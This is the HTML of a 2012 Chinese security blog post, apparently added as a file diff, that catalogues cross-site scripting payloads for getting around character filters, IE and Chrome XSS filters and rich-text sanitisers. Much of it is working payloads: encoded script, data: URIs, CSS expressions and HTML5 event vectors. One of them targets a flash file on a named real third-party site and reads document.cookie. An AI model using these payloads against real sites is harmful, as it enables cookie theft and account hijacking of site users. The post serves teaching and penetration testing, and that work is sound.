@@ -1,0 +1,452 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>跨站测试与利用中的绕过技术 - Ourren</title>
+  <meta name="author" content="ourren">
+
+  
+  <meta name="description" content="1.1 bypass Char 通常有安全意识的程序员往往会对输入进行一定的过滤，比较常见的是针对某一关键符号进行过滤，比如“&lt;”或者“>”，这种方式很多时候是无法防止攻击的，更安全的方式是通过编程语言提供的函数在输出的时候进行过滤。 本节主要针对单字符过滤进行研究，分为引号、尖括号、 &hellip;&#8221;>
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://blog.ourren.com/blog/2012/09/03/xss_bypass_technology/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Ourren" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Ourren</a></h1>
+  
+    <h2>关注技术，记录生活.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="blog.ourren.com/blog">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+    <li><a href="/">Home</a></li>
+    <li><a href="http://www.ourren.com">Ourren</a></li>
+    <li><a href="http://www.sec-wiki.com">SecWiki</a></li>
+    <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">跨站测试与利用中的绕过技术</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-09-03T00:00:00-07:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>1.1 bypass Char</h2>
+
+
+<p>通常有安全意识的程序员往往会对输入进行一定的过滤，比较常见的是针对某一关键符号进行过滤，比如“&lt;”或者“>”，这种方式很多时候是无法防止攻击的，更安全的方式是通过编程语言提供的函数在输出的时候进行过滤。</p>
+
+<p>本节主要针对单字符过滤进行研究，分为引号、尖括号、括号这三个符号进行研究。</p>
+
+<h3>1.1.1 引号</h3>
+
+
+<p>在跨站测试中很多的vector(即攻击向量)本身是不包含引号的，例如下面的一些vector。但是在利用中经常需要使用引号，如果对引号进行了过滤，可以采取如下措施进行绕过。
+[code lang=&ldquo;javascript&rdquo;]
+vector:</p>
+
+<script>alert(/ourren_demo/)</script>
+
+
+<p>&lt;iframe/onload=alert(/ourren_demo/)>
+<img src=x onerror=alert(/ourren_demo/)>
+<p onmouseover=alert(/ourren_demo/)>ourren_demo here.</p>
+[/code]
+<strong>1)String.fromCharCode</strong></p>
+
+<p>fromCharCode可以对利用代码中的引号进行编码处理，但是需要利用eval函数结合进行使用，例如:
+[code lang=&ldquo;javascript&rdquo;]
+<script>alert(&lsquo;ourren_demo&rsquo;)</script>
+&mdash;&ndash;>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,105,110,115,105,103,104,116,45,108,97,98,115,39,41))</script>
+[/code]
+<strong>2)location.hash</strong></p>
+
+<p>将带有引号的内容放在location.hash中，其实这个也可以突破跨站长度的控制。
+[code lang=&ldquo;javascript&rdquo;]
+<script>eval(location.hash.slice(1))</script>#alert(&lsquo;a&rsquo;)[/code]
+<h3>1.1.2 尖括号</h3>
+通常程序员为了偷懒都只会过滤尖括号，因此尖括号在跨站过滤中遇到情况最多。一般情况下如果输入没有显示在其他标签里，那么基本上是没有办法进行攻击的，但是如果是输出到其他标签里，则可以结合上下标签进行如下测试：</p>
+
+<p><strong>1</strong><strong>）事件函数</strong></p>
+
+<p>常用的一些事件函数有：onerror、onmouseover、onload等(同时可以关注下HTML5新标签)，需要的时候可以对JavaScript的事件函数进行fuzz。
+[code lang=&ldquo;javascript&rdquo;]
+ <img src=x onerror=alert(/ourren_demo/)>
+ <p onmouseover=alert(/ourren_demo/)>ourren_demo here.</p>
+ <frameset onload=alert(/ourren_demo/)>
+ <body onload=alert(/ourren_demo/)>[/code]</p>
+
+<p><strong>2)style</strong><strong>与expression</strong></p>
+
+<p>通过标签的style样式进行跨站(测试中只有IE成功，同时还得考虑filter问题)。
+[code lang=&ldquo;javascript&rdquo;]
+<div style="width:expression(alert('ourren_demo'));">  [/code]</p>
+
+<p><strong>3)</strong> <strong>JavaScript</strong><strong>伪协议</strong></p>
+
+<p>JavaScript伪协议进行绕过。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+ <img src=javascript:alert('ourren_demo')> （仅IE)  [/code]
+<h3>1.1.3 括号</h3>
+如果测试中发现括号被过滤了，或者无法注入括号，可以进行如下测试：</p>
+
+<p>1）外部文件</p>
+
+<p>通过src引入外部文件，而利用代码放在外部文件中（其中外部文件的后缀可以不为js）。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<script src='1.js'></script>
+<script src='2.jpg'></script>
+[/code]</p>
+
+<p>2）hex、dec编码</p>
+
+<p>利用十六进制与十进制进行编码。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<div style="&#119&#105&#100&#116&#104&#58&#101&#120&#112&#114&#101&#115&#115&#105&#111&#110&#40&#97
+&#108&#101&#114&#116&#40&#39&#120&#115&#115&#101&#114&#39&#41&#41">xsser</div>
+[/code]
+<h2>1.2 bypass filter</h2>
+针对跨站问题日益严重，浏览器厂商从自身浏览器安全出发推出了各自的跨站过滤器。但是这类过滤器基本上只支持反射型跨站，其他类型跨站基本不受影响。</p>
+
+<p>各种浏览器采用的防御机制各不相同。反射型跨站防御方面：Firefox基本没什么防御，而IE和chrome都有各自的防御机制，并且都很难绕过，这里主要总结下现有的一些可以绕过机制。
+<h3>1.2.1 IE Filter</h3>
+IE从IE7就支持XSS Filter，其整体架构可见参考文献1，正则匹配部分可以参见文献2。实际处理步骤可分为三步：首先对IE进行启发式过滤（heuristic filters，正则匹配）；如果在HTTP请求中匹配到这些特征，那么就做一个动态签名（create dynamic signature）；如果在HTTP响应中有原来的签名，那么就进行替换修改（neuter response）。在IE全补丁下进行测试，现有公布的绕过技术基本上很少，先总结如下：</p>
+
+<p><strong>1</strong><strong>）<a href=></strong></p>
+
+<p>针对普通的反射型跨站，可以利用A标签和“sc%0aript”实现绕过，不过需要用户交互，这里需要美工师咯。其实原理是页面输出后这两个页面属于同一域，因此不会产生过滤。如果href里面的地址是不同域就会产生过滤。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<a href="xss.php?a=<sc%0aript>alert(/ourren_demo/)</script>&ldquo;>
+<a href="xss.php?a=<sc%0aript>alert(/ourren_demo/)</script>&rdquo;>
+<div style="position: absolute; left: 0px; top: 0px; height: 1000px; width: 1000px;
+padding: 1em;background:black;text-align: center;">click to continue</div></a>
+[/code]</p>
+
+<p><strong>2</strong><strong>）utf7</strong></p>
+
+<p>通过UTF7-BOM实现注入代码，全补丁情况下只有当header里编码为utf-7才能成功，可以参考文献3。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+%2BACIAPgA8-script%2BAD4-alert%28/ourren_demo/%29%2BADw-%2Fscript%2BAD4APAAi-&amp;oe=Windows-31J
+[/code]</p>
+
+<p><strong>3) Flash</strong></p>
+
+<p>在 <a href="http://blog.ourren.com">www.B.com</a>域名下用iframe嵌入<a href="http://blog.ourren.com">www.A.com</a>的flash XSS文件。当受害者打开了<a href="http://blog.ourren.com">www.B.com</a>的域名时，我们可以成功获取其在<a href="http://blog.ourren.com">www.A.com</a>的cookies数据，参见文献8。</p>
+
+<p>测试代码如下(IE)：</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+&lt;iframe/src=&ldquo;<a href="http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=">http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=</a>
+(function(){location.href=%22javascript:&lsquo;<script>alert(document.cookie)</script>&rsquo;%22})()&rdquo;></iframe>
+[/code]</p>
+
+<p>在chrome中，可能会导致浏览器崩溃，可以改用以下代码。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+&lt;iframe/src=&ldquo;<a href="http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=">http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=</a>
+(function(){alert(document.cookie)})()&rdquo;></iframe>
+[/code]
+<h3>1.2.2 chrome filter</h3>
+chrome浏览器针对xss过滤规则跟IE有比较大的区别，不同版本的chrome测试也会不同，现有的资料可以参考文献4、5。</p>
+
+<p><strong>1）  </strong><strong>data</strong><strong>协议</strong></p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+?vuln=<a href="javascript:alert(document.cookie);">click</a> //会拦截
+&ndash;>转换成  <a href="javascript:void(0)">click</a>
+//bypass
+?vuln=<a href="data:text/html;
+base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gd29ybGQhJyk8L3NjcmlwdD4=
+">click<a>
+->OK
+[/code]</p>
+
+<p><h2>1.3 bypass richtext</h2>
+富文本常见类别有留言，日志或者邮件等。与一般的跨站相比它可以使用现有的标签进行测试分析。一般过滤机制分为两种：黑名单、白名单，这两类机制实质都是基于正则匹配进行过滤，因此在测试过程中需要对比输入和输出，然后进行针对性变化。</p>
+
+<p>常见测试流程：输入常见标签和事件&mdash;&mdash;>是否有存在的标签没有过滤&mdash;&mdash;->变形或者分析其属性</p>
+
+<p>标签：<em>object, applet, base, link, meta, import, embed, vmlframe, iframe, script, style, isindex, form</em><em>，</em><em>textarea</em><em>，</em></p>
+
+<p>字符：<em>javascript:, vbscript: </em></p>
+
+<p>事件：<em>onload,onerror,on*</em>
+<h3>1.3.1 绕过规则</h3>
+本小节将一些常见的一些变化规则进行了归类，实际测试中结合多种方式进行组合测试。</p>
+
+<p><strong> 1</strong><strong>）未递归过滤</strong></p>
+
+<p>很多富文本过滤都是针对关键字过滤，但是没有进行递归过滤，导致过滤后的结果重新组成新的标签，例如：</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+&lt;ifra<iframe>me>之&mdash;&mdash;过滤&mdash;&mdash;<iframe>&mdash;&mdash;&mdash;-<iframe>
+&lt;s<script></script>cript>&mdash;&ndash;过滤&mdash;<script>&mdash;&mdash;&mdash;-<script></script>
+[/code]
+<strong>2)</strong><strong>编码</strong></p>
+
+<p>利用字符的十六进制和十进制编码进行绕过关键字。由于expression只有IE能执行，因此仅限于IE。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+ <div style="width:expression(alert(/ourren_demo/))">ourren_demo</div><br/>
+<div style="width:\0065xpression(alert(/ourren_demo/))">ourren_demo</div>
+//两次不同类型编码
+<div style="width:\0065xpressio\6e(alert(/ourren_demo/))">ourren_demo</div><br/>
+<div style="&#119&#105&#100&#116&#104&#58&#101&#120&#112&#114&#101&#115&#115&#105&#111&#110
+&#40&#97&#108&#101&#114&#116&#40&#39&#120&#115&#115&#101&#114&#39&#41&#41">xsser</div>
+[/code]</p>
+
+<p><strong>3)</strong><strong>特殊字符</strong></p>
+
+<p>在构造的vector中可以插入tab、换行、等其他空白字符或者&#8221;/**&ldquo;绕过关键字匹配，基本上也只限于IE。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<img src="java  scr ipt:alert(/ourren_demo/)">  两次tab,ie6
+<div style="width:exp/**
+**/ression(alert(/ourren_demo/))">ourren_demo</div>  IE
+[/code]</p>
+
+<p><strong>4)</strong><strong>非常见协议</strong></p>
+
+<p>利用object标签，将date属性数据进行base64编码绕过关键数据，同时object标签也是经常被遗忘的标签。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgvaW5zaWdodC1sYWJzLyk8L3NjcmlwdD4=">
+[/code]</p>
+
+<p><strong>5)HTML5</strong></p>
+
+<p>利用HTML5新标签或者新属性进行绕过，相对而言这类利用要求的环境相对比较苛刻，详细见参考文献6。</p>
+
+<p>新标签:<em><button>,<video>,<audio>,<article>,<footer>,<nav></em></p>
+
+<p>新属性:<em>autocomplete, autofocus, pattern ..etc</em></p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<input onfocus=write(1) autofocus>
+<video poster=javascript:alert(1)//></video>
+[/code]</p>
+
+<p><strong>6)</strong><strong>浏览器方面</strong></p>
+
+<p>可以从浏览器解析角度进行考虑，需要浏览器解析方面进行深入分析，然后进行改进与分析，提供几个这类的vector。</p>
+
+<p>// IE的注释方式
+[code lang=&ldquo;javascript&rdquo;]
+<!--[if IE]><img src=# width=0 height=0 onerror=alert(/ourren_demo/)>&lt;![endif]&ndash;><br/>
+<comment><img src="</comment><img src=x onerror=alert(/ourren_demo/)//">   IE
+[/code]
+<h3>1.3.2 利用技巧</h3>
+在实际利用中常常会遇到一些其它问题，比如说代码死循环，长度不够用等先将其总结如下：</p>
+
+<p><strong>       1)expression</strong></p>
+
+<p>由于expression属性比较特殊,同时只支持IE，而其执行相当于一个死循环的EVAL函数，同时style标记里不能出现&#8221;;&ldquo;字符，也就是不能构造多条连接在一起的javascript，因此构造出如下语句：</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<DIV STYLE="xss:ex/**/pre/**/ssion(eval(xss));" xss="var Then=new Date();Then.setTime(Then.getTime()+10*1000);
+if(document.cookie.indexOf('Cookie1=') == -1){document.cookie='Cookie1=RAY;expires='+Then.toGMTString();
+alert(/ourren_demo/);}">
+//设置一个COOKIE在10秒后失效，并在这条COOKIE语句中执行其他语句或函数。
+也可以通过window对象来实现：
+<div style="width:expression((window.x==1)?'':(window.x=1,alert(/ourren_demo/)))">xsser</div>
+[/code]</p>
+
+<p><strong>2)</strong><strong>长度限制</strong></p>
+
+<p>这个在&#8221;突破XSS字符数量限制执行任意JS代码&#8221;一文中有详细讲解，参考文献7。当然在支持HTML5的浏览器还可以利用下本地存储。
+<h2><em>参考文献</em></h2>
+<em>1.</em><a href="http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx"><em><a href="http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx">http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx</a></em></a><em> </em></p>
+
+<p><em>2. Abusing Internet Explorer 8&rsquo;s XSS Filters.pdf </em></p>
+
+<p><em>3. </em><a href="http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html"><em><a href="http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html">http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html</a></em></a><em> </em></p>
+
+<p><em>4. </em><a href="http://evilcos.me/?p=60"><em><a href="http://evilcos.me/?p=60">http://evilcos.me/?p=60</a></em></a><em> </em></p>
+
+<p><em>5. </em><a href="http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html"><em><a href="http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html">http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html</a></em></a><em> </em></p>
+
+<p><em>6. </em><a href="http://html5sec.org/"><em><a href="http://html5sec.org/">http://html5sec.org/</a></em></a><em> </em></p>
+
+<p><em>7. </em><a href="http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt"><em><a href="http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt">http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt</a></em></a><em> </em></p>
+
+<p><em>8.</em> <a href="http://zone.wooyun.org/content/368"><a href="http://zone.wooyun.org/content/368">http://zone.wooyun.org/content/368</a></a><em></em></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">ourren</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2012-09-03T00:00:00-07:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/categories/security/'>security</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/2012/08/17/personal_learn_method_and_knowledge_manage/" title="Previous Post: 浅谈个人学习方法与知识管理">&laquo; 浅谈个人学习方法与知识管理</a>
+      
+      
+        <a class="basic-alignment right" href="/2012/10/25/naive_bayes_algorithm_for_data_mining/" title="Next Post: 数据挖掘之朴素贝叶斯算法">数据挖掘之朴素贝叶斯算法 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+<section>
+    <div id="comments" aria-live="polite"><!-- Duoshuo Comment BEGIN -->
+<div class="ds-thread" data-title="跨站测试与利用中的绕过技术"></div>
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"ourren"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = 'http://static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+<!-- Duoshuo Comment END --></div>
+</section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+    <h1>分类目录</h1>
+    <ul>
+        <li>
+            <a href="http://blog.ourren.com/categories/life" title="life thing and think">生活</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/research" title="do some research in daily life">研究</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/security" title="all security articles">安全</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/technology" title="all program and code">技术</a>
+        </li>
+    </ul>
+</section><section>
+    <h1>友情链接</h1>
+    <ul>
+        <li><a href="http://ohroot.com/" target="_blank">Direwolf</a></li>
+        <li><a href="http://www.insight-labs.org/">insight-labs</a></li>
+        <li><a href="http://lx.shellcodes.org/">lu4nx</a></li>
+        <li><a href="http://www.metasploit.cn/forum.php" title="Metasploit 中文站" target="_blank">Metasploit</a></li>
+        <li><a href="http://www.ourren.com/" target="_blank">ourren</a></li>
+    </ul>
+</section>
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - ourren -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
